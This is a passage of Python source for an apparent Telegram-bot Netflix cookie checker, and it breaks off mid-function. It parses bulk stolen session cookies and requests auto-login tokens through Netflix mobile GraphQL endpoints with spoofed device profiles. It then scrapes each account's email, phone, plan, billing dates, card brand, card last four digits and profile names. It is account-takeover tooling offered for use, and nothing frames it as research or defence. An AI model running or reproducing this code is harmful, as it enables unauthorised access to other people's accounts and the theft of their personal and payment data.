logging.basicConfig(format='%(asctime)s - %(name)s - %(levelname)s - %(message)s', level=logging.INFO)
for _quiet_logger in ('httpx', 'httpcore', 'telegram.request'):
    logging.getLogger(_quiet_logger).setLevel(logging.WARNING)
logger = logging.getLogger(__name__)

active_tasks = {}
user_stats = {}

def get_user_stats(user_id: int) -> dict:
    if user_id not in user_stats: user_stats[user_id] = {'total': 0, 'success': 0}
    return user_stats[user_id]

def update_stats(user_id: int, total: int = 0, success: int = 0):
    stats = get_user_stats(user_id)
    stats['total'] += total
    stats['success'] += success

API_ENDPOINTS = ['https://android.prod.ftl.netflix.com/graphql', 'https://ios.prod.ftl.netflix.com/graphql', 'https://android-appboot.netflix.com/graphql']

DEVICE_PROFILES = [
    {
        'user_agent': 'Mozilla/5.0 (Linux; Android 14; SM-S928B Build/UP1A.231005.007) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/126.0.6478.122 Mobile Safari/537.36',
        'platform': 'android',
    },
    {
        'user_agent': 'Mozilla/5.0 (Linux; Android 13; Pixel 8 Pro Build/TQ3A.230901.001) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/125.0.6422.165 Mobile Safari/537.36',
        'platform': 'android',
    },
    {
        'user_agent': 'Mozilla/5.0 (iPhone; CPU iPhone OS 17_5_1 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/17.5 Mobile/15E148 Safari/604.1',
        'platform': 'ios',
    },
    {
        'user_agent': 'Mozilla/5.0 (Linux; Android 14; SM-A546B Build/UP1A.231005.007) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/127.0.6533.64 Mobile Safari/537.36',
        'platform': 'android',
    },
]

QUERY_CONFIGS = [
    {
        "operationName": "CreateAutoLoginToken",
        "variables": {"scope": "WEBVIEW_MOBILE_STREAMING"},
        "extensions": {
            "persistedQuery": {
                "version": 102,
                "id": "76e97129-f4b5-41a0-a73c-12e674896849"
            }
        }
    },
    {
        "operationName": "CreateAutoLoginToken",
        "variables": {"scope": "WEBVIEW_MOBILE"},
        "extensions": {
            "persistedQuery": {
                "version": 102,
                "id": "76e97129-f4b5-41a0-a73c-12e674896849"
            }
        }
    },
    {
        "operationName": "CreateAutoLoginToken",
        "variables": {"scope": "NATIVE_MOBILE_STREAMING"},
        "extensions": {
            "persistedQuery": {
                "version": 102,
                "id": "76e97129-f4b5-41a0-a73c-12e674896849"
            }
        }
    },
]


class NetflixTokenChecker:
    def __init__(self):
        self.session = self._create_session()
        self.last_working_endpoint = 0
        self.last_working_query = 0

    def _create_session(self):
        session = requests.Session()
        retry_strategy = Retry(
            total=MAX_RETRIES,
            backoff_factor=RETRY_BACKOFF,
            status_forcelist=[429, 500, 502, 503, 504, 408],
        )
        adapter = HTTPAdapter(max_retries=retry_strategy)
        session.mount("http://", adapter)
        session.mount("https://", adapter)
        return session

    def _get_headers(self, cookie_str: str) -> Dict[str, str]:
        profile = random.choice(DEVICE_PROFILES)
        return {
            'User-Agent': profile['user_agent'],
            'Accept': 'application/json, text/plain, */*',
            'Accept-Language': 'en-US,en;q=0.9',
            'Accept-Encoding': 'gzip, deflate, br',
            'Content-Type': 'application/json',
            'Origin': 'https://www.netflix.com',
            'Referer': 'https://www.netflix.com/',
            'Cookie': cookie_str,
            'X-Netflix-Client-Type': 'mobile',
            'Connection': 'keep-alive',
        }

    def extract_cookies_from_text(self, text: str) -> List[Dict[str, str]]:
        if not isinstance(text, str) or not text.strip():
            return []

        cookies_list = []
        seen = set()

        def add_cookie(cookie: Dict[str, str]):
            netflix_id = cookie.get('NetflixId', '').strip()
            if not netflix_id:
                return
            cookie['NetflixId'] = netflix_id
            if cookie.get('SecureNetflixId'):
                cookie['SecureNetflixId'] = cookie['SecureNetflixId'].strip()
            key = (cookie.get('NetflixId', ''), cookie.get('SecureNetflixId', ''))
            if key not in seen:
                seen.add(key)
                cookies_list.append(cookie)

        for line in text.splitlines():
            line = line.strip()
            if not line or line.startswith('#'):
                continue

            parts = line.split('\t')
            if len(parts) >= 7:
                name, value = parts[5].strip(), parts[6].strip()
                if name == 'NetflixId':
                    add_cookie({'NetflixId': value})
                elif name == 'SecureNetflixId':
                    for cookie in reversed(cookies_list):
                        if not cookie.get('SecureNetflixId'):
                            cookie['SecureNetflixId'] = value
                            break
                continue

            netflix_match = re.search(r'(?<![A-Za-z])NetflixId=([^;\s&]+)', line)
            secure_match = re.search(r'(?<![A-Za-z])SecureNetflixId=([^;\s&]+)', line)
            if netflix_match:
                cookie = {'NetflixId': netflix_match.group(1)}
                if secure_match:
                    cookie['SecureNetflixId'] = secure_match.group(1)
                add_cookie(cookie)
                continue

            token_match = re.search(r'(?<![A-Za-z])(v%3D[^\s&;]+|ct%3D[^\s&;]+)', line)
            if token_match:
                add_cookie({'NetflixId': token_match.group(1)})

        return cookies_list

    def build_cookie_string(self, cookie_dict: Dict[str, str]) -> str:
        return '; '.join([f"{k}={v}" for k, v in cookie_dict.items()])

    def build_netscape_format(self, cookie_dict: Dict[str, str]) -> str:
        netscape = ["# Netscape HTTP Cookie File"]
        domain = ".netflix.com"
        path = "/"
        secure = "TRUE"
        expiry = "2147483647"
        for key, value in cookie_dict.items():
            netscape.append(f"{domain}\tTRUE\t{path}\t{secure}\t{expiry}\t{key}\t{value}")
        return "\n".join(netscape)

    def _mask_email(self, email: str) -> str:
        """Mask email: pan***@gmail.com"""
        if '@' not in email or email == 'N/A':
            return email
        local, domain = email.split('@', 1)
        if len(local) <= 3:
            masked = local[0] + '***'
        else:
            masked = local[:3] + '***'
        return f"{masked}@{domain}"

    def _get_country_currency(self, country_code: str) -> str:
        """Map country code or locale to currency symbol. Accepts 'VN' or 'en-VN'."""
        country_code = self._normalize_country_code(country_code)
        if not country_code:
            return ''
        currencies = {
            'US': '$', 'GB': '£', 'EU': '€', 'JP': '¥', 'KR': '₩',
            'TH': '฿', 'VN': '₫', 'IN': '₹', 'BR': 'R$', 'MX': '$',
            'CA': 'C$', 'AU': 'A$', 'DE': '€', 'FR': '€', 'IT': '€',
            'ES': '€', 'NL': '€', 'BE': '€', 'AT': '€', 'PT': '€',
            'PH': '₱', 'ID': 'Rp', 'MY': 'RM', 'SG': 'S$', 'TW': 'NT$',
            'HK': 'HK$', 'AR': 'ARS', 'CL': 'CLP', 'CO': 'COP',
            'PE': 'PEN', 'TR': '₺', 'PL': 'zł', 'SE': 'kr', 'NO': 'kr',
            'DK': 'kr', 'FI': '€', 'ZA': 'R', 'EG': 'E£', 'NG': '₦',
            'KE': 'KSh', 'SA': 'SAR', 'AE': 'AED', 'IL': '₪',
        }
        return currencies.get(country_code, '')

    def _normalize_country_code(self, raw: Any) -> str:
        """Return an ISO-3166 alpha-2 code from a code, locale, name, or Falcor object."""
        if raw is None:
            return ''

        if isinstance(raw, dict):
            for key in ('countryCode', 'country_code', 'code', 'country',
                        'value', 'locale', 'region'):
                if key in raw:
                    code = self._normalize_country_code(raw[key])
                    if code:
                        return code
            return ''

        value = str(raw).strip()
        if not value:
            return ''

        names = {
            'united states': 'US', 'usa': 'US', 'united kingdom': 'GB',
            'united states of america': 'US', 'great britain': 'GB',
            'canada': 'CA', 'australia': 'AU',
            'vietnam': 'VN', 'viet nam': 'VN', 'thailand': 'TH',
            'japan': 'JP', 'south korea': 'KR', 'korea': 'KR',
            'india': 'IN', 'brazil': 'BR', 'mexico': 'MX',
            'philippines': 'PH', 'indonesia': 'ID', 'malaysia': 'MY',
            'singapore': 'SG', 'taiwan': 'TW', 'hong kong': 'HK',
            'germany': 'DE', 'france': 'FR', 'italy': 'IT',
            'spain': 'ES', 'netherlands': 'NL', 'belgium': 'BE',
            'austria': 'AT', 'portugal': 'PT', 'turkey': 'TR',
        }
        named = names.get(' '.join(value.casefold().split()))
        if named:
            return named

        known_codes = set('''AD AE AF AG AI AL AM AO AQ AR AS AT AU AW AX AZ
BA BB BD BE BF BG BH BI BJ BL BM BN BO BQ BR BS BT BV BW BY BZ
CA CC CD CF CG CH CI CK CL CM CN CO CR CU CV CW CX CY CZ
DE DJ DK DM DO DZ EC EE EG EH ER ES ET FI FJ FK FM FO FR GA GB GD GE GF GG GH GI GL GM GN GP GQ GR GS GT GU GW GY
HK HM HN HR HT HU ID IE IL IM IN IO IQ IR IS IT JE JM JO JP KE KG KH KI KM KN KP KR KW KY KZ
LA LB LC LI LK LR LS LT LU LV LY MA MC MD ME MF MG MH MK ML MM MN MO MP MQ MR MS MT MU MV MW MX MY MZ
NA NC NE NF NG NI NL NO NP NR NU NZ OM PA PE PF PG PH PK PL PM PN PR PS PT PW PY QA RE RO RS RU RW
SA SB SC SD SE SG SH SI SJ SK SL SM SN SO SR SS ST SV SX SY SZ
TC TD TF TG TH TJ TK TL TM TN TO TR TT TV TW TZ UA UG UM US UY UZ
VA VC VE VG VI VN VU WF WS YE YT ZA ZM ZW'''.split())

        if re.fullmatch(r'[A-Za-z]{2}', value):
            code = value.upper()
            return code if code in known_codes else ''

        tokens = re.split(r'[-_@./\s]+', value)
        for token in reversed(tokens):
            code = token.upper()
            if code in known_codes:
                return code
        return ''

    def _format_timestamp(self, ts: str) -> str:
        """Convert numeric timestamp (seconds or milliseconds) to YYYY-MM-DD date string."""
        try:
            if not ts:
                return 'N/A'
            s = str(ts).strip()
            if re.match(r'^\d{10,}$', s):
                num = int(s)
                if len(s) > 10:
                    dt = datetime.utcfromtimestamp(num / 1000)
                else:
                    dt = datetime.utcfromtimestamp(num)
                return dt.strftime('%Y-%m-%d')
            try:
                dt = datetime.fromisoformat(s)
                return dt.strftime('%Y-%m-%d')
            except Exception:
                pass
            return s
        except Exception:
            return ts


    def _extract_build_id(self, html: str) -> Optional[str]:
        """Extract Netflix BUILD_IDENTIFIER from page HTML."""
        patterns = [
            r'"BUILD_IDENTIFIER"\s*:\s*"([^"]+)"',
            r'"buildIdentifier"\s*:\s*"([^"]+)"',
            r'"clientVersion"\s*:\s*"([^"]+)"',
            r'/api/shakti/([a-zA-Z0-9]+)/',
        ]
        for p in patterns:
            m = re.search(p, html)
            if m:
                return m.group(1)
        return None

    def _extract_auth_url(self, html: str) -> Optional[str]:
        """Extract authURL from Netflix page HTML for API calls."""
        m = re.search(r'"authURL"\s*:\s*"([^"]+)"', html)
        if m:
            val = m.group(1)
            val = re.sub(r'\\x([0-9a-fA-F]{2})', lambda mx: chr(int(mx.group(1), 16)), val)
            return val
        return None

    def _decode_netflix_json(self, raw: str) -> Optional[dict]:
        """Decode Netflix JSON that may contain \\x hex escapes."""
        try:
            cleaned = re.sub(r'\\x([0-9a-fA-F]{2})', lambda m: chr(int(m.group(1), 16)), raw)
            return json.loads(cleaned)
        except Exception:
            pass
        try:
            return json.loads(raw)
        except Exception:
            pass
        return None

    def _parse_react_context(self, html: str) -> Optional[dict]:
        """Extract and parse reactContext / embedded JSON from Netflix HTML."""
        patterns = [
            r'netflix\.reactContext\s*=\s*({.+?});\s*</script>',
            r'reactContext\s*=\s*({.+?});\s*</script>',
            r'netflix\.falcorCache\s*=\s*({.+?});\s*</script>',
            r'window\.__NEXT_DATA__\s*=\s*({.+?});\s*</script>',
        ]
        for pat in patterns:
            m = re.search(pat, html, re.DOTALL)
            if m:
                result = self._decode_netflix_json(m.group(1))
                if result:
                    return result
        return None

    def _unwrap_falcor(self, val: Any) -> Any:
        """Unwrap Netflix Falcor atom values: {$type:'atom', value:'X'} → 'X'"""
        if isinstance(val, dict):
            if '$type' in val and 'value' in val:
                return val['value']
            if 'value' in val and len(val) <= 3:
                return val['value']
        return val

    def _deep_find(self, data: Any, keys: list, max_depth: int = 20) -> dict:
        """Recursively search nested data for multiple keys at once. Returns {key: value}."""
        results = {}
        remaining = [k for k in keys if k not in results]
        if not remaining or max_depth <= 0:
            return results

        if isinstance(data, dict):
            for k, v in data.items():
                uv = self._unwrap_falcor(v)
                for target in remaining:
                    if target not in results and k == target:
                        if isinstance(uv, (str, int, float)):
                            results[target] = str(uv)
                        elif isinstance(uv, bool):
                            results[target] = uv
                        elif isinstance(uv, dict):
                            for vk in ['value', 'formattedPrice', 'displayValue', 'text',
                                        'label', 'name', 'localizedName', 'price']:
                                if vk in uv and isinstance(uv[vk], (str, int, float)):
                                    results[target] = str(uv[vk])
                                    break
                            else:
                                results[target] = uv
                        elif isinstance(uv, list):
                            results[target] = uv
                remaining = [k for k in keys if k not in results]
                if not remaining:
                    break
                sub = self._deep_find(v, remaining, max_depth - 1)
                results.update(sub)
                remaining = [k for k in keys if k not in results]
        elif isinstance(data, list):
            for item in data:
                remaining = [k for k in keys if k not in results]
                if not remaining:
                    break
                sub = self._deep_find(item, remaining, max_depth - 1)
                results.update(sub)

        return results

    def _parse_account_from_context(self, ctx: dict, info: dict):
        """Parse account info from reactContext or any Netflix JSON structure."""
        if not ctx:
            return

        models = ctx.get('models', {})
        if isinstance(models, dict):
            for model_name, model_data in models.items():
                inner = model_data.get('data', model_data) if isinstance(model_data, dict) else model_data
                if isinstance(inner, dict):
                    for field, targets in [
                        ('emailAddress', 'email'), ('email', 'email'),
                        ('firstName', 'account_name'), ('displayName', 'account_name'),
                        ('phoneNumber', 'phone'), ('contactPhoneNumber', 'phone'),
                        ('formattedPhoneNumber', 'phone'),
                        ('membershipStatus', 'membership_status'),
                        ('countryOfSignup', 'country'), ('currentCountry', 'country'),
                        ('localizedPlanName', 'plan'), ('planName', 'plan'),
                        ('formattedPrice', 'plan_price'), ('retailPrice', 'plan_price'),
                        ('planPrice', 'plan_price'),
                        ('memberSince', 'member_since'),
                        ('nextBillingDate', 'next_billing'),
                        ('mopName', 'cc_type'), ('cardBrand', 'cc_type'),
                        ('cardType', 'cc_type'), ('cardIssuer', 'cc_type'),
                        ('mopDisplayName', 'cc_type'),
                        ('lastFourDigits', 'last4'), ('cardLastFourDigits', 'last4'),
                        ('mopLastFour', 'last4'), ('last4Digits', 'last4'),
                        ('paymentType', 'payment_method'), ('mopType', 'payment_method'),
                        ('paymentMethodType', 'payment_method'),
                        ('videoQuality', 'video_quality'), ('planVideoQuality', 'video_quality'),
                        ('maxStreams', 'max_streams'),
                        ('extraMemberSlots', 'extra_member_slots'),
                    ]:
                        if field in inner and info.get(targets, 'N/A') == 'N/A':
                            raw_val = self._unwrap_falcor(inner[field])
                            if raw_val and (isinstance(raw_val, (str, int, float)) or
                                             (targets == 'country' and isinstance(raw_val, dict))):
                                val = str(raw_val)
                                if targets == 'email' and '@' not in val:
                                    continue
                                if targets == 'country':
                                    val = self._normalize_country_code(raw_val)
                                    if not val:
                                        continue
                                    info['country_currency'] = self._get_country_currency(val)
                                if targets == 'member_since':
                                    val = self._format_timestamp(val)
                                if targets == 'next_billing':
                                    val = self._format_timestamp(val)
                                if targets == 'email':
                                    info['email_masked'] = self._mask_email(val)
                                info[targets] = val

        search_keys = [
            'membershipStatus', 'countryOfSignup', 'currentCountry', 'signupCountry',
            'emailAddress', 'email', 'firstName', 'displayName', 'accountName',
            'phoneNumber', 'phone', 'mobileNumber', 'contactPhoneNumber',
            'formattedPhoneNumber', 'telephoneNumber',
            'localizedPlanName', 'planName', 'currentPlan', 'planDisplayName',
            'formattedPrice', 'planPrice', 'retailPrice', 'monthlyPrice',
            'currentPlanPrice', 'priceFormatted', 'formattedAmount',
            'memberSince', 'membershipStartDate', 'createdDate', 'startDate',
            'accountCreationDate', 'signupDate',
            'nextBillingDate', 'nextRenewalDate', 'renewalDate', 'nextPaymentDate',
            'paymentType', 'paymentMethod', 'mopType', 'paymentMethodType', 'billingType',
            'cardType', 'cardIssuer', 'issuer', 'cardBrand', 'mopName',
            'mopDisplayName', 'cardNetwork', 'paymentMethodLogo',
            'lastFourDigits', 'last4', 'accountLast4', 'cardLastFourDigits',
            'mopLastFour', 'lastDigits', 'last4Digits',
            'maxStreams', 'numOfDevices', 'concurrentStreams',
            'videoQuality', 'planVideoQuality', 'maxResolution',
            'extraMemberSlots', 'extraMembers',
            'profiles', 'allProfiles',
            'locale', 'preferredLocale', 'userLocale',
            'isOnHold', 'paymentOnHold', 'onHold',
        ]

        found = self._deep_find(ctx, search_keys)

        for key in ['emailAddress', 'email']:
            val = found.get(key)
            if val and isinstance(val, str) and '@' in val and info['email'] == 'N/A':
                info['email'] = val
                info['email_masked'] = self._mask_email(val)
                break

        for key in ['firstName', 'displayName', 'accountName']:
            val = found.get(key)
            if val and isinstance(val, str) and info['account_name'] == 'N/A':
                info['account_name'] = val
                break

        for key in ['phoneNumber', 'phone', 'mobileNumber', 'contactPhoneNumber',
                    'formattedPhoneNumber', 'telephoneNumber']:
            val = found.get(key)
            if val and isinstance(val, str) and info['phone'] == 'N/A':
                info['phone'] = val
                break

        for key in ['countryOfSignup', 'currentCountry', 'signupCountry']:
            val = self._normalize_country_code(found.get(key))
            if val and info['country'] == 'N/A':
                info['country'] = val
                info['country_currency'] = self._get_country_currency(val)
                break
        if info['country'] == 'N/A':
            for key in ['locale', 'preferredLocale', 'userLocale']:
                cc = self._normalize_country_code(found.get(key))
                if cc:
                    info['country'] = cc
                    info['country_currency'] = self._get_country_currency(cc)
                    break

        val = found.get('membershipStatus')
        if val and isinstance(val, str) and info['membership_status'] == 'N/A':
            info['membership_status'] = val

        for key in ['localizedPlanName', 'planName', 'currentPlan']:
            val = found.get(key)
            if val and isinstance(val, str) and info['plan'] == 'N/A':
                info['plan'] = val
                break

        for key in ['formattedPrice', 'planPrice', 'retailPrice', 'monthlyPrice',
                    'currentPlanPrice', 'priceFormatted', 'formattedAmount']:
            val = found.get(key)
            if val and info['plan_price'] == 'N/A':
                info['plan_price'] = str(val)
                break

        for key in ['memberSince', 'membershipStartDate', 'createdDate', 'startDate']:
            val = found.get(key)
            if val and info['member_since'] == 'N/A':
                info['member_since'] = self._format_timestamp(str(val))
                break

        for key in ['nextBillingDate', 'nextRenewalDate', 'renewalDate']:
            val = found.get(key)
            if val and info['next_billing'] == 'N/A':
                info['next_billing'] = self._format_timestamp(str(val))
                break

        for key in ['paymentType', 'paymentMethod', 'mopType']:
            val = found.get(key)
            if val and isinstance(val, str) and info['payment_method'] == 'N/A':
                info['payment_method'] = val
                break

        for key in ['cardType', 'cardIssuer', 'issuer', 'cardBrand', 'mopName',
                    'mopDisplayName', 'cardNetwork', 'paymentMethodLogo']:
            val = found.get(key)
            if val and isinstance(val, str) and info['cc_type'] == 'N/A':
                info['cc_type'] = val
                break

        for key in ['lastFourDigits', 'last4', 'accountLast4', 'cardLastFourDigits',
                    'mopLastFour', 'lastDigits', 'last4Digits']:
            val = found.get(key)
            if val and info['last4'] == 'N/A':
                info['last4'] = str(val)
                break

        for key in ['videoQuality', 'planVideoQuality', 'maxResolution']:
            val = found.get(key)
            if val and isinstance(val, str) and info['video_quality'] == 'N/A':
                info['video_quality'] = val
                break

        for key in ['maxStreams', 'numOfDevices', 'concurrentStreams']:
            val = found.get(key)
            if val and info['max_streams'] == 'N/A':
                info['max_streams'] = str(val)
                break

        for key in ['extraMemberSlots', 'extraMembers']:
            val = found.get(key)
            if val is not None and info['extra_member'] == 'N/A':
                if isinstance(val, (int, float)):
                    info['extra_member_slots'] = str(int(val))
                    info['extra_member'] = 'Có' if int(val) > 0 else 'Không'
                elif isinstance(val, str) and val.isdigit():
                    info['extra_member_slots'] = val
                    info['extra_member'] = 'Có' if int(val) > 0 else 'Không'
                break

        for key in ['isOnHold', 'paymentOnHold', 'onHold']:
            val = found.get(key)
            if val is not None and info['payment_on_hold'] == 'N/A':
                if isinstance(val, bool):
                    info['payment_on_hold'] = 'Có' if val else 'Không'
                elif isinstance(val, str):
                    info['payment_on_hold'] = 'Có' if val.lower() in ('true', 'yes', '1') else 'Không'
                break

        for key in ['profiles', 'allProfiles']:
            val = found.get(key)
            if val and isinstance(val, list) and not info['profiles']:
                pnames = []
                for p in val:
                    if isinstance(p, dict):
                        name = (p.get('profileName') or p.get('name') or
                                p.get('firstName') or p.get('rawFirstName'))
                        if name:
                            pnames.append(str(name))
                    elif isinstance(p, str):
                        pnames.append(p)
                if pnames:
                    info['profiles'] = list(dict.fromkeys(pnames))
                    info['profile_count'] = str(len(info['profiles']))
                break

    def _scrape_account_regex(self, html: str, info: dict):
        """Fallback: regex scrape from raw HTML for any remaining N/A fields."""
        if not html or len(html) < 100:
            return

        if info['email'] == 'N/A':
            m = re.search(r'"(?:emailAddress|email|userEmail)"\s*:\s*"([^"]+@[^"]+)"', html)
            if m:
                info['email'] = m.group(1)
                info['email_masked'] = self._mask_email(m.group(1))

        if info['account_name'] == 'N/A':
            m = re.search(r'"(?:firstName|displayName|accountName)"\s*:\s*"([^"]{1,50})"', html)
            if m:
                info['account_name'] = m.group(1)

        if info['phone'] == 'N/A':
            m = re.search(r'"(?:phoneNumber|phone|mobileNumber|contactPhoneNumber|formattedPhoneNumber|telephoneNumber)"\s*:\s*"([^"]+)"', html)
            if m:
                info['phone'] = m.group(1)
        if info['phone'] == 'N/A':
            m = re.search(r'"(?:phone|mobile|tel|contact)\w*"\s*:\s*"(\+?\d[\d\s\-()]{6,18})"', html, re.I)
            if m:
                info['phone'] = m.group(1).strip()

        if info['plan'] == 'N/A':
            m = re.search(r'"(?:localizedPlanName|planName)"\s*:\s*"([^"]+)"', html)
            if m:
                info['plan'] = m.group(1)
            else:
                for label in ['Premium', 'Standard with ads', 'Standard',
                              'Basic with ads', 'Basic', 'Mobile']:
                    if label in html:
                        info['plan'] = label
                        break

        if info['plan_price'] == 'N/A':
            m = re.search(r'"(?:formattedPrice|planPrice|retailPrice|localizedPrice)"\s*:\s*"([^"]+)"', html)
            if m:
                info['plan_price'] = m.group(1)

        if info['member_since'] == 'N/A':
            m = re.search(r'"(?:memberSince|membershipStartDate|createdDate)"\s*:\s*"?(\d{10,13}|[^",}]+)"?', html)
            if m:
                info['member_since'] = self._format_timestamp(m.group(1).strip('"'))

        if info['next_billing'] == 'N/A':
            m = re.search(r'"(?:nextBillingDate|nextRenewalDate|renewalDate)"\s*:\s*"?(\d{10,13}|[^",}]+)"?', html)
            if m:
                info['next_billing'] = self._format_timestamp(m.group(1).strip('"'))

        if info['payment_method'] == 'N/A':
            m = re.search(r'"(?:paymentType|paymentMethod|mopType)"\s*:\s*"([^"]+)"', html)
            if m:
                info['payment_method'] = m.group(1)

        if info['cc_type'] == 'N/A':
            m = re.search(r'"(?:cardType|cardIssuer|issuer|cardBrand|mopName|mopDisplayName|cardNetwork)"\s*:\s*"([^"]+)"', html)
            if m:
                info['cc_type'] = m.group(1)

        if info['last4'] == 'N/A':
            m = re.search(r'"(?:lastFourDigits|last4|accountLast4|cardLastFourDigits|mopLastFour|lastDigits|last4Digits)"\s*:\s*"?(\d{4})"?', html)
            if m:
                info['last4'] = m.group(1)

        if info['membership_status'] == 'N/A':
            if 'CURRENT_MEMBER' in html:
                info['membership_status'] = 'CURRENT_MEMBER'
            elif 'FORMER_MEMBER' in html:
                info['membership_status'] = 'FORMER_MEMBER'
            elif 'ON HOLD' in html or 'ON_HOLD' in html:
                info['membership_status'] = 'ON HOLD'

        if info['payment_on_hold'] == 'N/A':
            info['payment_on_hold'] = 'Có' if (
                'ON_HOLD' in html or '"onHold":true' in html or '"isOnHold":true' in html
            ) else 'Không'

        if info['max_streams'] == 'N/A':
            m = re.search(r'"(?:maxStreams|numOfDevices|concurrentStreams)"\s*:\s*(\d+)', html)
            if m:
                info['max_streams'] = m.group(1)

        if info['video_quality'] == 'N/A':
            m = re.search(r'"(?:videoQuality|planVideoQuality|maxResolution)"\s*:\s*"([^"]+)"', html)
            if m:
                info['video_quality'] = m.group(1)

        if info['extra_member'] == 'N/A':
            m = re.search(r'"extraMemberSlots"\s*:\s*(\d+)', html)
            if m:
                slots = int(m.group(1))
                info['extra_member_slots'] = str(slots)
                info['extra_member'] = 'Có' if slots > 0 else 'Không'

        if not info['profiles']:
            profs = re.findall(r'"(?:profileName|rawFirstName)"\s*:\s*"([^"]+)"', html)
            if profs:
                seen = list(dict.fromkeys(profs))
                info['profiles'] = seen
                info['profile_count'] = str(len(seen))

        if info['country'] == 'N/A':
            m = re.search(r'"(?:countryOfSignup|currentCountry|signupCountry)"\s*:\s*"([^"]+)"', html)
            if m:
                cc = self._normalize_country_code(m.group(1))
                if cc:
                    info['country'] = cc
                    info['country_currency'] = self._get_country_currency(cc)

    def get_account_info(self, cookie_dict: Dict[str, str]) -> Dict[str, str]:
        """Get comprehensive Netflix account info using multiple API methods."""
        info = {
            'account_name': 'N/A', 'email': 'N/A', 'email_masked': 'N/A',
            'phone': 'N/A', 'country': 'N/A', 'country_currency': '',
            'membership_status': 'N/A', 'plan': 'N/A', 'plan_price': 'N/A',
            'member_since': 'N/A', 'next_billing': 'N/A', 'payment_method': 'N/A',
            'cc_type': 'N/A', 'last4': 'N/A', 'payment_on_hold': 'N/A',
            'video_quality': 'N/A', 'max_streams': 'N/A', 'extra_member': 'N/A',
            'extra_member_slots': 'N/A', 'profile_count': 'N/A', 'profiles': [],
        }
        try:
            cookie_str = self.build_cookie_string(cookie_dict)
            headers = {
                'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/131.0.0.0 Safari/537.36',
                'Accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8',
                'Accept-Language': 'en-US,en;q=0.9',
                'Accept-Encoding': 'gzip, deflate, br',
                'Connection': 'keep-alive',
                'Cookie': cookie_str,
                'Upgrade-Insecure-Requests': '1',
                'Sec-Fetch-Dest': 'document',
                'Sec-Fetch-Mode': 'navigate',
                'Sec-Fetch-Site': 'none',
                'Sec-Fetch-User': '?1',
            }
            build_id = None
            auth_url = None
            all_html = ''

            target_urls = [
                'https://www.netflix.com/YourAccount',
                'https://www.netflix.com/browse',
                'https://www.netflix.com/account/membership',
                'https://www.netflix.com/account',
            ]

            for url in target_urls:
                try:
                    res = self.session.get(url, headers=headers, timeout=15, allow_redirects=True)
                    if res.status_code != 200:
                        continue

                    html = res.text
                    all_html += html

                    if not build_id:
                        build_id = self._extract_build_id(html)

                    if not auth_url:
                        auth_url = self._extract_auth_url(html)

                    ctx = self._parse_react_context(html)
                    if ctx:
                        self._parse_account_from_context(ctx, info)

                    json_blobs = re.findall(
                        r'<script[^>]*>\s*(?:window\.\w+\s*=\s*|var\s+\w+\s*=\s*|netflix\.\w+\s*=\s*)({.+?});\s*</script>',
                        html, re.DOTALL
                    )
                    for blob in json_blobs:
                        parsed = self._decode_netflix_json(blob)
                        if parsed and isinstance(parsed, dict):
                            self._parse_account_from_context(parsed, info)

                except Exception as e:
                    logger.debug(f"Failed to fetch {url}: {e}")
                    continue

            if build_id:
                shakti_headers = {
                    'User-Agent': headers['User-Agent'],
                    'Accept': 'application/json, text/javascript, */*',
                    'Accept-Language': 'en-US,en;q=0.9',
                    'Cookie': cookie_str,
                    'X-Netflix-Client-Platform': 'browser',
                    'Connection': 'keep-alive',
                }

                try:
                    profiles_url = f'https://www.netflix.com/api/shakti/{build_id}/profiles'
                    pres = self.session.get(profiles_url, headers=shakti_headers, timeout=10)
                    if pres.status_code == 200:
                        pdata = pres.json()
                        pnames = []
                        prof_list = pdata if isinstance(pdata, list) else (
                            pdata.get('profiles') or pdata.get('allProfiles') or []
                        )
                        for p in prof_list:
                            if isinstance(p, dict):
                                name = (p.get('profileName') or p.get('firstName')
                                        or p.get('rawFirstName'))
                                if name:
                                    pnames.append(str(name))
                        if pnames and not info['profiles']:
                            info['profiles'] = list(dict.fromkeys(pnames))
                            info['profile_count'] = str(len(info['profiles']))
                except Exception as e:
                    logger.debug(f"Shakti profiles failed: {e}")

                try:
                    path_url = f'https://www.netflix.com/api/shakti/{build_id}/pathEvaluator'
                    pe_params = {
                        'paths': json.dumps([
                            ["billing", "currentPlan", "planName"],
                            ["billing", "currentPlan", "localizedPlanName"],
                            ["billing", "currentPlan", "retailPrice"],
                            ["billing", "currentPlan", "formattedPrice"],
                            ["billing", "currentPlan", "videoQuality"],
                            ["billing", "currentPlan", "maxStreams"],
                            ["billing", "currentPlan", "extraMemberSlots"],
                            ["billing", "nextBillingDate"],
                            ["billing", "currentPaymentMethod", "type"],
                            ["billing", "currentPaymentMethod", "cardType"],
                            ["billing", "currentPaymentMethod", "cardBrand"],
                            ["billing", "currentPaymentMethod", "mopName"],
                            ["billing", "currentPaymentMethod", "mopDisplayName"],
                            ["billing", "currentPaymentMethod", "lastFourDigits"],
                            ["billing", "currentPaymentMethod", "last4"],
                            ["billing", "currentPaymentMethod", "cardLastFourDigits"],
                            ["billing", "currentPaymentMethod", "displayName"],
                            ["membershipStatus"],
                            ["countryOfSignup"],
                            ["userInfo", "firstName"],
                            ["userInfo", "emailAddress"],
                            ["userInfo", "phoneNumber"],
                            ["userInfo", "contactPhoneNumber"],
                            ["userInfo", "memberSince"],
                        ]),
                        'falcorFormat': 'JSON',
                    }
                    if auth_url:
                        pe_params['authURL'] = auth_url

                    pe_res = self.session.get(
                        path_url, params=pe_params,
                        headers=shakti_headers, timeout=10
                    )
                    if pe_res.status_code == 200:
                        pe_data = pe_res.json()
                        if 'jsonGraph' in pe_data:
                            pe_data = pe_data['jsonGraph']
                        self._parse_account_from_context(pe_data, info)
                except Exception as e:
                    logger.debug(f"Shakti pathEvaluator failed: {e}")

            self._scrape_account_regex(all_html, info)


            if info['email'] != 'N/A' and info['email_masked'] == 'N/A':
                info['email_masked'] = self._mask_email(info['email'])

            if info['video_quality'] == 'N/A' and info['plan'] != 'N/A':
                plan_lower = info['plan'].lower()
                if 'premium' in plan_lower:
                    info['video_quality'] = '4K + HDR'
                elif 'standard' in plan_lower:
                    info['video_quality'] = '1080p (Full HD)'
                elif 'basic' in plan_lower:
                    info['video_quality'] = '720p (HD)'
                elif 'mobile' in plan_lower:
